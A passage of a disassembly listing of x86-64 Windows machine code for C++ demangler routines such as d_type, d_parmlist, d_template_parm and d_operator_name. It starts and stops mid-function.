   140003823:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003829:	01 43 48             	add    %eax,0x48(%rbx)
   14000382c:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140003830:	e9 9d f7 ff ff       	jmp    140002fd2 <d_type+0x142>
   140003835:	0f 1f 00             	nopl   (%rax)
   140003838:	31 ff                	xor    %edi,%edi
   14000383a:	e9 e4 fa ff ff       	jmp    140003323 <d_type+0x493>
   14000383f:	48 83 c0 01          	add    $0x1,%rax
   140003843:	48 89 d9             	mov    %rbx,%rcx
   140003846:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000384a:	e8 a1 0f 00 00       	call   1400047f0 <d_template_args_1>
   14000384f:	49 89 f8             	mov    %rdi,%r8
   140003852:	ba 04 00 00 00       	mov    $0x4,%edx
   140003857:	48 89 d9             	mov    %rbx,%rcx
   14000385a:	49 89 c1             	mov    %rax,%r9
   14000385d:	e8 9e e4 ff ff       	call   140001d00 <d_make_comp>
   140003862:	48 89 c7             	mov    %rax,%rdi
   140003865:	e9 4b ff ff ff       	jmp    1400037b5 <d_type+0x925>
   14000386a:	8b 6b 4c             	mov    0x4c(%rbx),%ebp
   14000386d:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   140003874:	48 89 d9             	mov    %rbx,%rcx
   140003877:	e8 44 12 00 00       	call   140004ac0 <d_expression_1>
   14000387c:	89 6b 4c             	mov    %ebp,0x4c(%rbx)
   14000387f:	48 89 c7             	mov    %rax,%rdi
   140003882:	48 85 c0             	test   %rax,%rax
   140003885:	0f 84 45 f7 ff ff    	je     140002fd0 <d_type+0x140>
   14000388b:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   14000388f:	41 0f b6 02          	movzbl (%r10),%eax
   140003893:	e9 80 fa ff ff       	jmp    140003318 <d_type+0x488>
   140003898:	48 8d 45 01          	lea    0x1(%rbp),%rax
   14000389c:	48 89 d9             	mov    %rbx,%rcx
   14000389f:	44 8b 73 28          	mov    0x28(%rbx),%r14d
   1400038a3:	44 8b 6b 38          	mov    0x38(%rbx),%r13d
   1400038a7:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400038ab:	44 8b 63 48          	mov    0x48(%rbx),%r12d
   1400038af:	e8 3c 0f 00 00       	call   1400047f0 <d_template_args_1>
   1400038b4:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400038b8:	80 3a 49             	cmpb   $0x49,(%rdx)
   1400038bb:	74 15                	je     1400038d2 <d_type+0xa42>
   1400038bd:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   1400038c1:	44 89 73 28          	mov    %r14d,0x28(%rbx)
   1400038c5:	44 89 6b 38          	mov    %r13d,0x38(%rbx)
   1400038c9:	44 89 63 48          	mov    %r12d,0x48(%rbx)
   1400038cd:	e9 9e f7 ff ff       	jmp    140003070 <d_type+0x1e0>
   1400038d2:	48 85 ff             	test   %rdi,%rdi
   1400038d5:	0f 84 f5 f6 ff ff    	je     140002fd0 <d_type+0x140>
   1400038db:	8b 53 38             	mov    0x38(%rbx),%edx
   1400038de:	3b 53 3c             	cmp    0x3c(%rbx),%edx
   1400038e1:	0f 8d e9 f6 ff ff    	jge    140002fd0 <d_type+0x140>
   1400038e7:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   1400038eb:	4c 63 c2             	movslq %edx,%r8
   1400038ee:	83 c2 01             	add    $0x1,%edx
   1400038f1:	4a 89 3c c1          	mov    %rdi,(%rcx,%r8,8)
   1400038f5:	89 53 38             	mov    %edx,0x38(%rbx)
   1400038f8:	e9 93 f9 ff ff       	jmp    140003290 <d_type+0x400>
   1400038fd:	49 83 c0 03          	add    $0x3,%r8
   140003901:	8b 6b 4c             	mov    0x4c(%rbx),%ebp
   140003904:	c7 43 4c 01 00 00 00 	movl   $0x1,0x4c(%rbx)
   14000390b:	48 89 d9             	mov    %rbx,%rcx
   14000390e:	4c 89 43 18          	mov    %r8,0x18(%rbx)
   140003912:	e8 a9 11 00 00       	call   140004ac0 <d_expression_1>
   140003917:	89 6b 4c             	mov    %ebp,0x4c(%rbx)
   14000391a:	48 89 c7             	mov    %rax,%rdi
   14000391d:	48 85 c0             	test   %rax,%rax
   140003920:	0f 85 89 fc ff ff    	jne    1400035af <d_type+0x71f>
   140003926:	e9 a5 f6 ff ff       	jmp    140002fd0 <d_type+0x140>
   14000392b:	83 f8 10             	cmp    $0x10,%eax
   14000392e:	0f 85 9c f6 ff ff    	jne    140002fd0 <d_type+0x140>
   140003934:	48 83 c2 01          	add    $0x1,%rdx
   140003938:	8b 43 28             	mov    0x28(%rbx),%eax
   14000393b:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   14000393f:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   140003942:	0f 8d d8 55 02 00    	jge    140028f20 <d_type.cold>
   140003948:	48 63 f8             	movslq %eax,%rdi
   14000394b:	45 31 c0             	xor    %r8d,%r8d
   14000394e:	83 c0 01             	add    $0x1,%eax
   140003951:	48 c1 e7 05          	shl    $0x5,%rdi
   140003955:	48 03 7b 20          	add    0x20(%rbx),%rdi
   140003959:	4c 89 47 04          	mov    %r8,0x4(%rdi)
   14000395d:	89 43 28             	mov    %eax,0x28(%rbx)
   140003960:	48 8d 05 d9 f5 34 00 	lea    0x34f5d9(%rip),%rax        # 140352f40 <cplus_demangle_builtin_types+0x460>
   140003967:	48 89 47 10          	mov    %rax,0x10(%rdi)
   14000396b:	8b 43 48             	mov    0x48(%rbx),%eax
   14000396e:	c7 07 28 00 00 00    	movl   $0x28,(%rdi)
   140003974:	83 c0 0f             	add    $0xf,%eax
   140003977:	e9 e8 fa ff ff       	jmp    140003464 <d_type+0x5d4>
   14000397c:	e8 9f c3 00 00       	call   14000fd20 <__stack_chk_fail>
   140003981:	31 ff                	xor    %edi,%edi
   140003983:	e9 88 fa ff ff       	jmp    140003410 <d_type+0x580>
   140003988:	e8 43 c3 00 00       	call   14000fcd0 <__chk_fail>
   14000398d:	90                   	nop
   14000398e:	66 90                	xchg   %ax,%ax

0000000140003990 <d_parmlist>:
   140003990:	41 55                	push   %r13
   140003992:	41 54                	push   %r12
   140003994:	55                   	push   %rbp
   140003995:	57                   	push   %rdi
   140003996:	56                   	push   %rsi
   140003997:	53                   	push   %rbx
   140003998:	48 83 ec 38          	sub    $0x38,%rsp
   14000399c:	48 8b 3d cd 02 35 00 	mov    0x3502cd(%rip),%rdi        # 140353c70 <.refptr.__stack_chk_guard>
   1400039a3:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   1400039a9:	48 bd 01 00 80 00 08 	movabs $0x800800001,%rbp
   1400039b0:	00 00 00 
   1400039b3:	49 bd 00 00 00 00 12 	movabs $0x1200000000,%r13
   1400039ba:	00 00 00 
   1400039bd:	48 8b 07             	mov    (%rdi),%rax
   1400039c0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400039c5:	31 c0                	xor    %eax,%eax
   1400039c7:	48 89 cb             	mov    %rcx,%rbx
   1400039ca:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   1400039cf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400039d6:	00 00 
   1400039d8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400039dc:	0f b6 08             	movzbl (%rax),%ecx
   1400039df:	84 c9                	test   %cl,%cl
   1400039e1:	74 5d                	je     140003a40 <d_parmlist+0xb0>
   1400039e3:	83 e9 2e             	sub    $0x2e,%ecx
   1400039e6:	80 f9 24             	cmp    $0x24,%cl
   1400039e9:	77 16                	ja     140003a01 <d_parmlist+0x71>
   1400039eb:	4c 89 e2             	mov    %r12,%rdx
   1400039ee:	48 d3 e2             	shl    %cl,%rdx
   1400039f1:	48 85 ea             	test   %rbp,%rdx
   1400039f4:	75 4a                	jne    140003a40 <d_parmlist+0xb0>
   1400039f6:	4c 85 ea             	test   %r13,%rdx
   1400039f9:	74 06                	je     140003a01 <d_parmlist+0x71>
   1400039fb:	80 78 01 45          	cmpb   $0x45,0x1(%rax)
   1400039ff:	74 3f                	je     140003a40 <d_parmlist+0xb0>
   140003a01:	48 89 d9             	mov    %rbx,%rcx
   140003a04:	e8 87 f4 ff ff       	call   140002e90 <d_type>
   140003a09:	49 89 c0             	mov    %rax,%r8
   140003a0c:	48 85 c0             	test   %rax,%rax
   140003a0f:	0f 84 83 00 00 00    	je     140003a98 <d_parmlist+0x108>
   140003a15:	45 31 c9             	xor    %r9d,%r9d
   140003a18:	ba 2f 00 00 00       	mov    $0x2f,%edx
   140003a1d:	48 89 d9             	mov    %rbx,%rcx
   140003a20:	e8 db e2 ff ff       	call   140001d00 <d_make_comp>
   140003a25:	48 89 06             	mov    %rax,(%rsi)
   140003a28:	48 85 c0             	test   %rax,%rax
   140003a2b:	74 6b                	je     140003a98 <d_parmlist+0x108>
   140003a2d:	48 8d 70 18          	lea    0x18(%rax),%rsi
   140003a31:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003a35:	0f b6 08             	movzbl (%rax),%ecx
   140003a38:	84 c9                	test   %cl,%cl
   140003a3a:	75 a7                	jne    1400039e3 <d_parmlist+0x53>
   140003a3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003a40:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003a45:	48 85 c0             	test   %rax,%rax
   140003a48:	74 4e                	je     140003a98 <d_parmlist+0x108>
   140003a4a:	48 83 78 18 00       	cmpq   $0x0,0x18(%rax)
   140003a4f:	74 1f                	je     140003a70 <d_parmlist+0xe0>
   140003a51:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   140003a56:	48 2b 17             	sub    (%rdi),%rdx
   140003a59:	75 41                	jne    140003a9c <d_parmlist+0x10c>
   140003a5b:	48 83 c4 38          	add    $0x38,%rsp
   140003a5f:	5b                   	pop    %rbx
   140003a60:	5e                   	pop    %rsi
   140003a61:	5f                   	pop    %rdi
   140003a62:	5d                   	pop    %rbp
   140003a63:	41 5c                	pop    %r12
   140003a65:	41 5d                	pop    %r13
   140003a67:	c3                   	ret
   140003a68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003a6f:	00 
   140003a70:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140003a74:	83 3a 28             	cmpl   $0x28,(%rdx)
   140003a77:	75 d8                	jne    140003a51 <d_parmlist+0xc1>
   140003a79:	48 8b 52 10          	mov    0x10(%rdx),%rdx
   140003a7d:	83 7a 1c 09          	cmpl   $0x9,0x1c(%rdx)
   140003a81:	75 ce                	jne    140003a51 <d_parmlist+0xc1>
   140003a83:	8b 52 08             	mov    0x8(%rdx),%edx
   140003a86:	29 53 48             	sub    %edx,0x48(%rbx)
   140003a89:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
   140003a90:	00 
   140003a91:	eb be                	jmp    140003a51 <d_parmlist+0xc1>
   140003a93:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003a98:	31 c0                	xor    %eax,%eax
   140003a9a:	eb b5                	jmp    140003a51 <d_parmlist+0xc1>
   140003a9c:	e8 7f c2 00 00       	call   14000fd20 <__stack_chk_fail>
   140003aa1:	90                   	nop
   140003aa2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003aa9:	00 00 00 00 
   140003aad:	0f 1f 00             	nopl   (%rax)

0000000140003ab0 <d_bare_function_type>:
   140003ab0:	56                   	push   %rsi
   140003ab1:	53                   	push   %rbx
   140003ab2:	48 83 ec 28          	sub    $0x28,%rsp
   140003ab6:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140003aba:	80 38 4a             	cmpb   $0x4a,(%rax)
   140003abd:	48 89 cb             	mov    %rcx,%rbx
   140003ac0:	74 5e                	je     140003b20 <d_bare_function_type+0x70>
   140003ac2:	85 d2                	test   %edx,%edx
   140003ac4:	74 3a                	je     140003b00 <d_bare_function_type+0x50>
   140003ac6:	48 89 d9             	mov    %rbx,%rcx
   140003ac9:	e8 c2 f3 ff ff       	call   140002e90 <d_type>
   140003ace:	48 89 c6             	mov    %rax,%rsi
   140003ad1:	48 85 c0             	test   %rax,%rax
   140003ad4:	74 3c                	je     140003b12 <d_bare_function_type+0x62>
   140003ad6:	48 89 d9             	mov    %rbx,%rcx
   140003ad9:	e8 b2 fe ff ff       	call   140003990 <d_parmlist>
   140003ade:	49 89 c1             	mov    %rax,%r9
   140003ae1:	48 85 c0             	test   %rax,%rax
   140003ae4:	74 2c                	je     140003b12 <d_bare_function_type+0x62>
   140003ae6:	49 89 f0             	mov    %rsi,%r8
   140003ae9:	ba 2a 00 00 00       	mov    $0x2a,%edx
   140003aee:	48 89 d9             	mov    %rbx,%rcx
   140003af1:	48 83 c4 28          	add    $0x28,%rsp
   140003af5:	5b                   	pop    %rbx
   140003af6:	5e                   	pop    %rsi
   140003af7:	e9 04 e2 ff ff       	jmp    140001d00 <d_make_comp>
   140003afc:	0f 1f 40 00          	nopl   0x0(%rax)
   140003b00:	48 89 d9             	mov    %rbx,%rcx
   140003b03:	31 f6                	xor    %esi,%esi
   140003b05:	e8 86 fe ff ff       	call   140003990 <d_parmlist>
   140003b0a:	49 89 c1             	mov    %rax,%r9
   140003b0d:	48 85 c0             	test   %rax,%rax
   140003b10:	75 d4                	jne    140003ae6 <d_bare_function_type+0x36>
   140003b12:	31 c0                	xor    %eax,%eax
   140003b14:	48 83 c4 28          	add    $0x28,%rsp
   140003b18:	5b                   	pop    %rbx
   140003b19:	5e                   	pop    %rsi
   140003b1a:	c3                   	ret
   140003b1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b20:	48 83 c0 01          	add    $0x1,%rax
   140003b24:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003b28:	eb 9c                	jmp    140003ac6 <d_bare_function_type+0x16>
   140003b2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003b30 <d_function_type>:
   140003b30:	53                   	push   %rbx
   140003b31:	48 83 ec 20          	sub    $0x20,%rsp
   140003b35:	48 89 cb             	mov    %rcx,%rbx
   140003b38:	f6 41 12 04          	testb  $0x4,0x12(%rcx)
   140003b3c:	75 2a                	jne    140003b68 <d_function_type+0x38>
   140003b3e:	8b 49 58             	mov    0x58(%rcx),%ecx
   140003b41:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
   140003b47:	77 28                	ja     140003b71 <d_function_type+0x41>
   140003b49:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003b4d:	8d 41 01             	lea    0x1(%rcx),%eax
   140003b50:	89 43 58             	mov    %eax,0x58(%rbx)
   140003b53:	31 c0                	xor    %eax,%eax
   140003b55:	80 3a 46             	cmpb   $0x46,(%rdx)
   140003b58:	74 26                	je     140003b80 <d_function_type+0x50>
   140003b5a:	89 4b 58             	mov    %ecx,0x58(%rbx)
   140003b5d:	48 83 c4 20          	add    $0x20,%rsp
   140003b61:	5b                   	pop    %rbx
   140003b62:	c3                   	ret
   140003b63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b68:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   140003b6c:	80 3a 46             	cmpb   $0x46,(%rdx)
   140003b6f:	74 0f                	je     140003b80 <d_function_type+0x50>
   140003b71:	31 c0                	xor    %eax,%eax
   140003b73:	48 83 c4 20          	add    $0x20,%rsp
   140003b77:	5b                   	pop    %rbx
   140003b78:	c3                   	ret
   140003b79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003b80:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003b84:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003b88:	80 7a 01 59          	cmpb   $0x59,0x1(%rdx)
   140003b8c:	75 08                	jne    140003b96 <d_function_type+0x66>
   140003b8e:	48 83 c2 02          	add    $0x2,%rdx
   140003b92:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003b96:	ba 01 00 00 00       	mov    $0x1,%edx
   140003b9b:	48 89 d9             	mov    %rbx,%rcx
   140003b9e:	e8 0d ff ff ff       	call   140003ab0 <d_bare_function_type>
   140003ba3:	48 89 d9             	mov    %rbx,%rcx
   140003ba6:	48 89 c2             	mov    %rax,%rdx
   140003ba9:	e8 12 e4 ff ff       	call   140001fc0 <d_ref_qualifier>
   140003bae:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003bb2:	80 3a 45             	cmpb   $0x45,(%rdx)
   140003bb5:	74 19                	je     140003bd0 <d_function_type+0xa0>
   140003bb7:	31 c0                	xor    %eax,%eax
   140003bb9:	f6 43 12 04          	testb  $0x4,0x12(%rbx)
   140003bbd:	75 9e                	jne    140003b5d <d_function_type+0x2d>
   140003bbf:	8b 53 58             	mov    0x58(%rbx),%edx
   140003bc2:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140003bc5:	eb 93                	jmp    140003b5a <d_function_type+0x2a>
   140003bc7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003bce:	00 00 
   140003bd0:	48 83 c2 01          	add    $0x1,%rdx
   140003bd4:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140003bd8:	eb df                	jmp    140003bb9 <d_function_type+0x89>
   140003bda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003be0 <d_template_parm>:
   140003be0:	56                   	push   %rsi
   140003be1:	53                   	push   %rbx
   140003be2:	48 83 ec 28          	sub    $0x28,%rsp
   140003be6:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140003bea:	80 38 54             	cmpb   $0x54,(%rax)
   140003bed:	48 89 cb             	mov    %rcx,%rbx
   140003bf0:	48 89 d6             	mov    %rdx,%rsi
   140003bf3:	75 41                	jne    140003c36 <d_template_parm+0x56>
   140003bf5:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003bf9:	80 fa 74             	cmp    $0x74,%dl
   140003bfc:	0f 84 8e 00 00 00    	je     140003c90 <d_template_parm+0xb0>
   140003c02:	7f 3c                	jg     140003c40 <d_template_parm+0x60>
   140003c04:	80 fa 6e             	cmp    $0x6e,%dl
   140003c07:	74 67                	je     140003c70 <d_template_parm+0x90>
   140003c09:	80 fa 70             	cmp    $0x70,%dl
   140003c0c:	75 28                	jne    140003c36 <d_template_parm+0x56>
   140003c0e:	48 83 c0 02          	add    $0x2,%rax
   140003c12:	48 89 f2             	mov    %rsi,%rdx
   140003c15:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003c19:	e8 c2 ff ff ff       	call   140003be0 <d_template_parm>
   140003c1e:	ba 5d 00 00 00       	mov    $0x5d,%edx
   140003c23:	49 89 c0             	mov    %rax,%r8
   140003c26:	48 85 c0             	test   %rax,%rax
   140003c29:	75 2a                	jne    140003c55 <d_template_parm+0x75>
   140003c2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c30:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   140003c36:	31 c0                	xor    %eax,%eax
   140003c38:	48 83 c4 28          	add    $0x28,%rsp
   140003c3c:	5b                   	pop    %rbx
   140003c3d:	5e                   	pop    %rsi
   140003c3e:	c3                   	ret
   140003c3f:	90                   	nop
   140003c40:	80 fa 79             	cmp    $0x79,%dl
   140003c43:	75 f1                	jne    140003c36 <d_template_parm+0x56>
   140003c45:	48 83 c0 02          	add    $0x2,%rax
   140003c49:	ba 5a 00 00 00       	mov    $0x5a,%edx
   140003c4e:	45 31 c0             	xor    %r8d,%r8d
   140003c51:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003c55:	45 31 c9             	xor    %r9d,%r9d
   140003c58:	48 89 d9             	mov    %rbx,%rcx
   140003c5b:	48 83 c4 28          	add    $0x28,%rsp
   140003c5f:	5b                   	pop    %rbx
   140003c60:	5e                   	pop    %rsi
   140003c61:	e9 9a e0 ff ff       	jmp    140001d00 <d_make_comp>
   140003c66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003c6d:	00 00 00 
   140003c70:	48 83 c0 02          	add    $0x2,%rax
   140003c74:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003c78:	e8 13 f2 ff ff       	call   140002e90 <d_type>
   140003c7d:	49 89 c0             	mov    %rax,%r8
   140003c80:	48 85 c0             	test   %rax,%rax
   140003c83:	74 ab                	je     140003c30 <d_template_parm+0x50>
   140003c85:	ba 5b 00 00 00       	mov    $0x5b,%edx
   140003c8a:	eb c9                	jmp    140003c55 <d_template_parm+0x75>
   140003c8c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003c90:	48 83 c0 02          	add    $0x2,%rax
   140003c94:	48 89 f2             	mov    %rsi,%rdx
   140003c97:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140003c9b:	e8 30 00 00 00       	call   140003cd0 <d_template_head>
   140003ca0:	49 89 c0             	mov    %rax,%r8
   140003ca3:	48 85 c0             	test   %rax,%rax
   140003ca6:	74 88                	je     140003c30 <d_template_parm+0x50>
   140003ca8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140003cac:	80 38 45             	cmpb   $0x45,(%rax)
   140003caf:	0f 85 7b ff ff ff    	jne    140003c30 <d_template_parm+0x50>
   140003cb5:	48 83 c0 01          	add    $0x1,%rax
   140003cb9:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140003cbe:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140003cc2:	eb 91                	jmp    140003c55 <d_template_parm+0x75>
   140003cc4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003ccb:	00 00 00 00 
   140003ccf:	90                   	nop

0000000140003cd0 <d_template_head>:
   140003cd0:	55                   	push   %rbp
   140003cd1:	57                   	push   %rdi
   140003cd2:	56                   	push   %rsi
   140003cd3:	53                   	push   %rbx
   140003cd4:	48 83 ec 38          	sub    $0x38,%rsp
   140003cd8:	48 8b 2d 91 ff 34 00 	mov    0x34ff91(%rip),%rbp        # 140353c70 <.refptr.__stack_chk_guard>
   140003cdf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003ce6:	00 00 
   140003ce8:	48 89 ce             	mov    %rcx,%rsi
   140003ceb:	48 89 d7             	mov    %rdx,%rdi
   140003cee:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
   140003cf3:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140003cf7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003cfc:	31 c0                	xor    %eax,%eax
   140003cfe:	eb 07                	jmp    140003d07 <d_template_head+0x37>
   140003d00:	48 89 03             	mov    %rax,(%rbx)
   140003d03:	48 8d 58 18          	lea    0x18(%rax),%rbx
   140003d07:	48 89 fa             	mov    %rdi,%rdx
   140003d0a:	48 89 f1             	mov    %rsi,%rcx
   140003d0d:	e8 ce fe ff ff       	call   140003be0 <d_template_parm>
   140003d12:	48 85 c0             	test   %rax,%rax
   140003d15:	75 e9                	jne    140003d00 <d_template_head+0x30>
   140003d17:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
   140003d1c:	4d 85 c0             	test   %r8,%r8
   140003d1f:	74 27                	je     140003d48 <d_template_head+0x78>
   140003d21:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003d26:	48 2b 45 00          	sub    0x0(%rbp),%rax
   140003d2a:	75 32                	jne    140003d5e <d_template_head+0x8e>
   140003d2c:	45 31 c9             	xor    %r9d,%r9d
   140003d2f:	ba 59 00 00 00       	mov    $0x59,%edx
   140003d34:	48 89 f1             	mov    %rsi,%rcx
   140003d37:	48 83 c4 38          	add    $0x38,%rsp
   140003d3b:	5b                   	pop    %rbx
   140003d3c:	5e                   	pop    %rsi
   140003d3d:	5f                   	pop    %rdi
   140003d3e:	5d                   	pop    %rbp
   140003d3f:	e9 bc df ff ff       	jmp    140001d00 <d_make_comp>
   140003d44:	0f 1f 40 00          	nopl   0x0(%rax)
   140003d48:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140003d4d:	48 2b 45 00          	sub    0x0(%rbp),%rax
   140003d51:	75 0b                	jne    140003d5e <d_template_head+0x8e>
   140003d53:	31 c0                	xor    %eax,%eax
   140003d55:	48 83 c4 38          	add    $0x38,%rsp
   140003d59:	5b                   	pop    %rbx
   140003d5a:	5e                   	pop    %rsi
   140003d5b:	5f                   	pop    %rdi
   140003d5c:	5d                   	pop    %rbp
   140003d5d:	c3                   	ret
   140003d5e:	e8 bd bf 00 00       	call   14000fd20 <__stack_chk_fail>
   140003d63:	90                   	nop
   140003d64:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003d6b:	00 00 00 00 
   140003d6f:	90                   	nop

0000000140003d70 <d_operator_name>:
   140003d70:	56                   	push   %rsi
   140003d71:	53                   	push   %rbx
   140003d72:	48 83 ec 28          	sub    $0x28,%rsp
   140003d76:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140003d7a:	44 0f b6 10          	movzbl (%rax),%r10d
   140003d7e:	48 89 cb             	mov    %rcx,%rbx
   140003d81:	45 84 d2             	test   %r10b,%r10b
   140003d84:	0f 84 ce 00 00 00    	je     140003e58 <d_operator_name+0xe8>
   140003d8a:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003d8e:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140003d92:	0f b6 70 01          	movzbl 0x1(%rax),%esi
   140003d96:	44 0f b6 10          	movzbl (%rax),%r10d
   140003d9a:	40 84 f6             	test   %sil,%sil
   140003d9d:	74 21                	je     140003dc0 <d_operator_name+0x50>
   140003d9f:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140003da3:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   140003da7:	0f b6 70 01          	movzbl 0x1(%rax),%esi
   140003dab:	41 80 fa 76          	cmp    $0x76,%r10b
   140003daf:	0f 85 fd 00 00 00    	jne    140003eb2 <d_operator_name+0x142>
   140003db5:	8d 46 d0             	lea    -0x30(%rsi),%eax
   140003db8:	3c 09                	cmp    $0x9,%al
   140003dba:	0f 86 9f 00 00 00    	jbe    140003e5f <d_operator_name+0xef>
   140003dc0:	41 b8 49 00 00 00    	mov    $0x49,%r8d
   140003dc6:	31 d2                	xor    %edx,%edx
   140003dc8:	4c 8d 1d d1 e4 34 00 	lea    0x34e4d1(%rip),%r11        # 1403522a0 <cplus_demangle_operators>
   140003dcf:	90                   	nop
   140003dd0:	44 89 c1             	mov    %r8d,%ecx
   140003dd3:	29 d1                	sub    %edx,%ecx
   140003dd5:	89 c8                	mov    %ecx,%eax
   140003dd7:	c1 e8 1f             	shr    $0x1f,%eax
   140003dda:	01 c8                	add    %ecx,%eax
   140003ddc:	d1 f8                	sar    $1,%eax
   140003dde:	01 d0                	add    %edx,%eax
   140003de0:	48 63 c8             	movslq %eax,%rcx
   140003de3:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   140003de7:	4d 8d 0c cb          	lea    (%r11,%rcx,8),%r9
   140003deb:	49 8b 09             	mov    (%r9),%rcx
   140003dee:	44 38 11             	cmp    %r10b,(%rcx)
   140003df1:	74 1d                	je     140003e10 <d_operator_name+0xa0>
   140003df3:	7f 5b                	jg     140003e50 <d_operator_name+0xe0>
   140003df5:	8d 50 01             	lea    0x1(%rax),%edx
   140003df8:	44 39 c2             	cmp    %r8d,%edx
   140003dfb:	75 d3                	jne    140003dd0 <d_operator_name+0x60>
   140003dfd:	31 c0                	xor    %eax,%eax
   140003dff:	48 83 c4 28          	add    $0x28,%rsp
   140003e03:	5b                   	pop    %rbx
   140003e04:	5e                   	pop    %rsi
   140003e05:	c3                   	ret
   140003e06:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003e0d:	00 00 00 
   140003e10:	40 38 71 01          	cmp    %sil,0x1(%rcx)
   140003e14:	75 dd                	jne    140003df3 <d_operator_name+0x83>
   140003e16:	8b 53 28             	mov    0x28(%rbx),%edx
   140003e19:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140003e1c:	7d df                	jge    140003dfd <d_operator_name+0x8d>
   140003e1e:	48 63 c2             	movslq %edx,%rax
   140003e21:	83 c2 01             	add    $0x1,%edx
   140003e24:	48 c1 e0 05          	shl    $0x5,%rax
   140003e28:	48 03 43 20          	add    0x20(%rbx),%rax
   140003e2c:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140003e33:	00 
   140003e34:	89 53 28             	mov    %edx,0x28(%rbx)
   140003e37:	c7 00 33 00 00 00    	movl   $0x33,(%rax)
   140003e3d:	4c 89 48 10          	mov    %r9,0x10(%rax)
   140003e41:	48 83 c4 28          	add    $0x28,%rsp
   140003e45:	5b                   	pop    %rbx
   140003e46:	5e                   	pop    %rsi
   140003e47:	c3                   	ret
   140003e48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003e4f:	00 
   140003e50:	41 89 c0             	mov    %eax,%r8d
   140003e53:	eb a3                	jmp    140003df8 <d_operator_name+0x88>
   140003e55:	0f 1f 00             	nopl   (%rax)
   140003e58:	31 f6                	xor    %esi,%esi
   140003e5a:	e9 61 ff ff ff       	jmp    140003dc0 <d_operator_name+0x50>
   140003e5f:	e8 3c ec ff ff       	call   140002aa0 <d_source_name>
   140003e64:	8b 53 28             	mov    0x28(%rbx),%edx
   140003e67:	48 89 c1             	mov    %rax,%rcx
   140003e6a:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   140003e6d:	7d 8e                	jge    140003dfd <d_operator_name+0x8d>
   140003e6f:	48 63 c2             	movslq %edx,%rax
   140003e72:	83 c2 01             	add    $0x1,%edx
   140003e75:	48 c1 e0 05          	shl    $0x5,%rax
